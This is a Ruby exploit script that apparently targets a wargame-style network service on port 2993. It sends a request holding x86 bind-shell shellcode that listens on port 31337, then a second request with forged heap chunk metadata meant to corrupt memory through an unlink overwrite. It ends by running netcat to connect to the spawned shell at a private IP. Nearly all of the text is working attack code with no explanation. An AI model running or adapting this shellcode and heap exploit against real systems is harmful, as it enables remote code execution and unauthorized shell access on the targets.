#!/usr/bin/ruby

require 'socket'

puts "> Enter hostname:"
hostname = gets.chomp
port = 2993
socket = TCPSocket.open(hostname, port)

# tcpbindshell  (108 bytes)
# http://shell-storm.org/shellcode/files/shellcode-847.php
PORTHL = "\x7a\x69" # default is \x7a\x69 = 31337
shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68" + PORTHL + "\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80"

# 0xfffffff8 = -8
# 0xfffffffc = -4
# 0x0804d41c = write_address
# 0x0804e014 = shellcode_address

#chunkMetadata = [0xfffffff8].pack("I") + [0xfffffffc].pack("I") + [0x0804d41c-0xc].pack("I") + [0x0804e014].pack("I")

chunkMetadata = "\xf8\xff\xff\xff" + "\xfc\xff\xff\xff" + "\x10\xd4\x04\x08" + "\x08\xe0\x04\x08"

chunkA = "FSRD" + "\x90" * 8 + shellcode + "\x90" * (128 - 4 - 8 - shellcode.bytesize - 1) + "/"


chunkB = "FSRD" + "z" * (128 - 4 - 8 - chunkMetadata.bytesize) + "ROOTzzz/" + chunkMetadata

puts chunkA.inspect
puts chunkB.inspect

socket.puts chunkA + chunkB

system("nc -v 192.168.215.129 31337")

socket.close
